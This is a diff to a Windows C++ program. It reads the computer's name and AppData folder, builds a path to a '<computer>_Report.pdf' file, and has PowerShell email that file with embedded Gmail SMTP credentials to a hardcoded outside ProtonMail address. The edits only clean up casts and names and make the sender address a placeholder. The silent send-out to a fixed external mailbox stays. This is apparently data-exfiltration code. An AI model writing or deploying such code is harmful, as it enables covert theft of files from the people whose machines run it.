@@ -1,15 +1,17 @@
 #include <windows.h>
+#include <wincrypt.h>
 #include <string>
 #include <fstream>
 #include <vector>
-#include <wincrypt.h>
+#include <shlobj.h>
 #pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "shell32.lib")
 
 std::string Base64Encode(const std::string& input) {
     DWORD encodedSize = 0;
     if (!CryptBinaryToStringA(
-        (const BYTE*)input.data(), 
-        input.size(),
+        reinterpret_cast<const BYTE*>(input.data()), 
+        static_cast<DWORD>(input.size()),
         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
         NULL,
         &encodedSize
@@ -18,8 +20,8 @@ std::string Base64Encode(const std::string& input) {
     std::string output;
     output.resize(encodedSize);
     if (!CryptBinaryToStringA(
-        (const BYTE*)input.data(), 
-        input.size(),
+        reinterpret_cast<const BYTE*>(input.data()), 
+        static_cast<DWORD>(input.size()),
         CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
         &output[0],
         &encodedSize
@@ -67,15 +69,15 @@ void SendEmail(const std::string& attachmentPath) {
 
     // Build PowerShell command
     std::string psCommand = 
-        "$smtpServer = 'smtp.gmail.com'\r\n"
-        "$smtpPort = 587\r\n"
-        "$username = 'elonmasai02@gmail.com'\r\n"
-        "$password = 'your_app_password'\r\n"  
-        "$securePass = ConvertTo-SecureString $password -AsPlainText -Force\r\n"
-        "$credential = New-Object System.Management.Automation.PSCredential($username, $securePass)\r\n"
+        "$smtpServer = 'smtp.gmail.com'\n"
+        "$smtpPort = 587\n"
+        "$username = 'your_email@gmail.com'\n"
+        "$password = 'your_app_password'\n"
+        "$securePass = ConvertTo-SecureString $password -AsPlainText -Force\n"
+        "$credential = New-Object System.Management.Automation.PSCredential($username, $securePass)\n"
         "Send-MailMessage -From $username -To 'elonmasai02@proton.me' -Subject '" + subject + "'" +
-        " -BodyAsHtml -Body '" + body + "'" +
-        " -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $credential";
+        " -Body '" + body + "'" +
+        " -SmtpServer $smtpServer -Port $smtpPort -UseSsl -Credential $credential -Encoding UTF8";
 
     // Execute PowerShell
     std::string fullCommand = "powershell -Command \"" + psCommand + "\"";
@@ -87,8 +89,8 @@ int main() {
     SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appDataPath);
     
     char computerName[MAX_COMPUTERNAME_LENGTH + 1];
-    DWORD size = sizeof(computerName);
-    GetComputerNameA(computerName, &size);
+    DWORD nameSize = sizeof(computerName);
+    GetComputerNameA(computerName, &nameSize);
     
     std::string pdfPath = std::string(appDataPath) + "\\" + computerName + "_Report.pdf";
     SendEmail(pdfPath);
